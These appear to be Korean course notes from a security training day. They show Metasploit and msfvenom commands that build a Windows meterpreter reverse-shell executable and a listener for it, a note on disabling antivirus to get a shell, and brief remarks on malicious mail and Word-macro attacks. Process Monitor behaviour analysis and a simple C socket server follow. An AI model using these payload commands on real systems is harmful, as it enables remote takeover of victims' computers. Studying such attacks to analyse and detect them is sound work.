# DAY 2

## 공격자 공격 방법 종류
  - EXE 파일
    1. 악성코드 생성도구(metasploit): 서버 백신 //서버백식은 악성코드 못잡은 경우 O
    2. DLL Injection
  - URL
  - MACRO
  - 웹 취약점
  - 모바일

## metasploit
### command
```
service postgresql start
service metasploit start
msfconsole
```
실행 안 될 경우
find /usr -name dalvik.rb -print <- 설정 파일 검색
마지막 줄 cert.not_after = cert.not_before + 3600 * 24 * 365 * 20
20 -> 2로 변경 후 저장

### command
```
search (search adobe)
use (exploit/linux/browser/adobe_flashplayer_aslaunch)
use windows/meterpreter/reverse_tcp //특정 공간 선택할 수 있음
back (cancel)
show options
set lhost 10.10.10.10
exploit //공격,      +encoders: 특정 기호로 변경
shellcode
bind (->, inbound)
reverse (<-, outbound)
```

#### senario
```
공격자가 피해자의 연결을 대기한다.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 7070
set lhost 10.0.2.15
exploit
```

#### 악성코드 생성
커널에서
```
msfvenom -l payloads
(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
c)
(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
apk)
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
exe > mytext.exe
```
#### 공유폴더/파일전송
이더넷 인터페이스 통신으로 전송
```
file system/media/sf_폴더명
```
> mytext.exe 옮기니 알약이 감지함
> 백신 끄고 실행하니 쉘 따짐


### AI보안2일(5)
```
process Explorer, Process Monitior, Strings 설치 필요
```
process Explorer에서 
> mytest.exe를 실행하면(셀을 실행하면) cmd.exe -> conhost.exe 순서로 실행됨(이 두 개의 패턴이 반드시 나온다)

Process Monitior에서 Operation부분 보면
> Process Start: 프로세스 시작  
> RegRegister, RegQuery: 레지스트리에서 환경 설정하는 값을 읽거나 썼다.  
> TCP Conect: 통신 프로그램에서 클라이언트가 쓰는 명령어! -> 따라서 클라이언트임을 알 수 있음  
Process Monitior에서 Detail-Event부분 보면  
> path: 발신자의ip:6125-> 수신자의ip:7070 //1) 왼쪽에서 7070포트로 들어갔다, 2) 발신자와 수신자의 ip 모두 확인 가능  
Detail-Process부분의 Modules 보면  
> mswsock.dll, wsock32.dll : 통신 관련된 기능, 소켓!  
Detail-Stack 보면 메모리 주소나 어떤 dll 썼는가 같은 정보 볼 수 있음  
**Process Monitior에서 TCP copy, TCP receive 같은게 있는데 더블 클릭해서 Event Properties-> Stack에서 뭘 했는지 알아야 함!!  
**
이제 이것을 보고 분석하면 행위가 됨!(행위 분석)  
아까 백신이 잡은 것은 signiture -> 단순 문자열에 대한 분석이 었음  

Process Monitior의 행위의 결과값 분석하는 법
> csv 파일로 저장  
> csv 파일은 ,로 구분되는데 detail 내용 안에 ,가 들어있기 때문에 , 제거해야함 -> 1. 고정되지 않은 수의 ',' 제거하는 프로그램 개발 필요  
> 2. 로그의 양이 많기 때문에 DB에 적재해야함!  
> RegOPenKey, RegQueryValue, RegCloseKey -> 3개가 세트! : 목적) 레지스트리를 읽는다  
>   이것을 변환 처리 해야하는데 위와 같이 둘 건지 RegRead 하나 두고 레지스트리를 읽었습니다 -> RegRead 1로 표현할 건지 결정해야함  

> CreateFile 부분에서 dll 파일 생성한다는 부분 있는데 dll은 이미 있기 때문에 말이 안됨  
> Detail 부분 보면 Read Attribute, Open -> 결론적으로 dll을 읽었다!는 뜻 => Create File이 아니라 Read File로 이름 바꾸는게 정확  
> => EDR, APT 솔루션 이미 있음  
 
#### 결론(해야 할 것)
- 행위분석 수집 로그 프로그램 개발 //프로세스 모니터 자체를 개발 해야함
- 전처리 프로그램 개발(A ->1, NULL, 이상치) 
- 데이터분석

* 메모리, 시그니처 분석
ex. process Explorer와 메모장   
process Explore에서 메모장 우클릭->properties   
  - 통신 안하니깐 TCP 부분 비어 있음   
  - Thread 부분 켜놓고, 메모징 저장 누르면 이 과정 Thread 부분에 동적으로 추가됨    
      -> 윈도우는 동적으로 동작하기 때문에 내가 실행할 때 dll 임의로 추가할 수 있음 => DLL Injection   
  
#### 악성코드 메일 공격 방식
> 메일 자동 전송 1:다 공격 가능
> 수신확인 - 스크립트(html)
> 파이썬 코드로 메일 전송 가능(mime)

#### 워드 매크로(CDR?)
passwordchecker procexp에서 full dump 후 strings로 분석   
strings PasswordChecker.dmp > a.txt    
비밀번호, 메세지 등 문자열로 저장되어 있음    
활용 ex    
> c소켓 프로그래밍 <- 서버
> 워드 매크로 <- 클라이언트
> 악성 메일 보내서 클릭 여부 확인 가능

주체: 행위, 메모리, 실행파일    
환경: 얘도 알아야    



![day2_2](https://user-images.githubusercontent.com/50771111/88466051-756ab380-cf03-11ea-972a-a8c19b88ad2f.jpg)



### 서버
#### test123.c //server.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

#define  BUFF_SIZE   1024

int   main( void)
{
   int   server_socket;
   int   client_socket;
   int   client_addr_size;
   struct sockaddr_in   server_addr;
   struct sockaddr_in   client_addr;
   char   buff_rcv[BUFF_SIZE+5];
  server_socket  = socket( PF_INET, SOCK_STREAM, 0); //소켓 만듦
   memset( &server_addr, 0, sizeof( server_addr));
   server_addr.sin_family     = AF_INET; //인터넷
   server_addr.sin_port       = htons(7070); //포트 7070 -> 서버
   server_addr.sin_addr.s_addr= htonl( INADDR_ANY); //0.0.0.0 누구나 연결할 수 있음
bind( server_socket, (struct sockaddr*)&server_addr, sizeof( server_addr)); //위에서 세팅한 값 적용(bind)
listen(server_socket, 5); //최대 5명까지 붙을 수 있음
client_socket     = accept( server_socket, (struct sockaddr*)&client_addr, &client_addr_size); //accept : 기다리는 중
      read ( client_socket, buff_rcv, BUFF_SIZE);
      printf( "receive: %s\n", buff_rcv);
 close( client_socket);
 close(server_socket);
}
```

